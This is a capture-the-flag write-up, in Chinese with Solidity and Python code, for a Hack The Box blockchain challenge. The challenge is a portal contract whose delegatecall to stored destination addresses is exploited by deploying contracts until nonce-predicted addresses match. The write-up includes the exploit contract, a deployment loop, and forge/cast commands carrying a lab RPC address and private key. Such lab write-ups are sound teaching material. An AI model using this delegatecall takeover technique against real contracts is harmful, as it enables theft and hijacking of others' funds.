---
title: HTB Blockchain Challenge - Honor Among Thieves
date: {{ date }}
cover   : "/img/htb3.jpeg"
---
Portal Nonsense
===

### Portal.sol
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract PortalStation {
    
    mapping(string => address) public destinations;
    mapping(string => bool) public isPortalActive;
    bool isExpertStandby;

    constructor() {
        destinations["orcKingdom"] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;
        destinations["elfKingdom"] = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;
        destinations["dawrfKingdom"] = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;
        isPortalActive["elfKingdom"] = true;
    }

    function requestPortal(string calldata _destination) public payable {
        require(destinations[_destination] != address(0));
        require(isExpertStandby, "Portal expert has a day off");
        require(msg.value > 1337 ether);

        isPortalActive[_destination] = true;
    }

    function createPortal(string calldata _destination) public {
        require(destinations[_destination] != address(0));
        
        (bool success, bytes memory retValue) = destinations[_destination].delegatecall(abi.encodeWithSignature("connect()"));
        require(success, "Portal destination is currently not available");
        require(abi.decode(retValue, (bool)), "Connection failed");
    }

}


```

### 分析
* 這題很明顯是要透過 `delegatecall` 呼叫外部合約來改變自身合約的變數
* 但這邊有一個問題在於，我們要如何產生一個合約地址是destinations裡面的其中之一
* 對於一般帳戶而言，合約的地址是取決於 deployer address 與 nonce
* 因此我們可以透過城市計算出需要部署多少個合約，可以得到我們目標的合約地址

#### 計算合約地址
* 可以使用 eth-util或是 foundryup 的 cli計算
* `cast compute-address {deployer} --nonce {nonce}`
```python=
import subprocess
import os
dest = ["0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1", "0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF", "0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007", "0xB89EcCb84C7CA4D2d28ecb49617982D4FF4c8CcE"]
dest = [i.lower() for i in dest]

deployer = "0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59"

for i in range(1,1000):
    ret = str(subprocess.check_output('cast compute-address '+deployer+ " --nonce " + str(i), shell=True))
    ret = ret.split(': ')[1].replace('\\n', '' ).replace("'", "")
    #print(ret)
    if ret.lower() in dest:
        print(i)
        print(ret)
        break

```

![image](https://hackmd.io/_uploads/r1hkR72_a.png)

* 只要我們生成130次合約，就可以取得目標地址




### Exploit
* 利用 delegatecall 來改變數

```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Delegate {
    mapping(string => address) public destinations;
    mapping(string => bool) public isPortalActive;
    bool isExpertStandby;
    bool public suc;
    bool public ret;
    constructor() payable {
        destinations["orcKingdom"] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;
        destinations["elfKingdom"] = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;
        destinations["dawrfKingdom"] = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;
        isPortalActive["elfKingdom"] = true;
    }
    receive() external payable {
    }
    function delegate(address _target) public {
        (bool success, bytes memory retValue) = _target.delegatecall(abi.encodeWithSignature("connect()"));
        require(success, "Portal destination is currently not available");
        require(abi.decode(retValue, (bool)), "Connection failed");
    }
}


```



* generate 130 
```python=
for i in range(131):
    ret = str(subprocess.check_output('forge create src/test.sol:test --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c', shell=True))
    print(ret)


```
* ` cast send --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c  0xACef632826fb9d4EF70cB70640b5F56b7474B3a9 "createPortal(string)" "orcKingdom"`

* `cast call --rpc-url http://167.99.85.216:30676/rpc --private-key 0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c  0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA "isSolved()"` 
